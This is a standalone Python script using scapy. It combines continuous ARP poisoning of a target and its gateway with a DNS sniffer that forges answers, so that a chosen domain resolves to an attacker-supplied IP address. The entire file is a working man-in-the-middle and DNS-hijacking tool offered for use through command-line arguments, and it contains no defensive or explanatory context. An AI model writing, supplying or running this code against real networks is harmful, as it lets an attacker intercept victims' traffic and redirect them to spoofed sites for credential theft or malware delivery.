#!/usr/bin/env python

from scapy.all import *
import argparse
import time
import threading

# Disable verbose output from scapy
conf.verb = 0

# ARP spoofing part
def get_mac(ip):
    # Send ARP request to get the MAC address of the IP
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Could not find MAC address for IP: {ip}")
        sys.exit(1)

def spoof_arp(target_ip, spoof_ip):
    # Get the MAC address of the target
    target_mac = get_mac(target_ip)
    # Send a malicious ARP response
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore_arp(target_ip, gateway_ip):
    # Restore the normal ARP table state after stopping the attack
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False)

# DNS spoofing part
def spoof_dns(pkt, spoofed_ip, target_domain):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        if target_domain in qname:
            print(f"[+] Spoofing DNS request for {qname}")
            # Create the DNS response
            dns_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                               an=DNSRR(rrname=qname, rdata=spoofed_ip))
            # Send the spoofed DNS response
            send(dns_response, verbose=False)

def packet_sniffer(spoofed_ip, target_domain):
    # Sniff DNS packets and apply the spoof_dns function
    sniff(filter="udp port 53", prn=lambda pkt: spoof_dns(pkt, spoofed_ip, target_domain))

# Combined attack
def arp_spoofing_attack(target_ip, gateway_ip):
    try:
        while True:
            # ARP spoof target (make it think we're the router)
            spoof_arp(target_ip, gateway_ip)
            # ARP spoof router (make it think we're the target)
            spoof_arp(gateway_ip, target_ip)
            time.sleep(2)  # Adjust the sleep time to reduce network traffic
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip)
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing and DNS Spoofing Script")
    parser.add_argument("-t", "--target-ip", help="Target IP address", required=True)
    parser.add_argument("-g", "--gateway-ip", help="Gateway IP address (usually the router)", required=True)
    parser.add_argument("-d", "--domain", help="Domain to spoof", required=True)
    parser.add_argument("-s", "--spoof-ip", help="IP address to spoof the domain with", required=True)
    args = parser.parse_args()

    # Run ARP spoofing in a separate thread
    arp_thread = threading.Thread(target=arp_spoofing_attack, args=(args.target_ip, args.gateway_ip))
    arp_thread.start()

    # Start DNS spoofing in the main thread
    packet_sniffer(args.spoof_ip, args.domain)
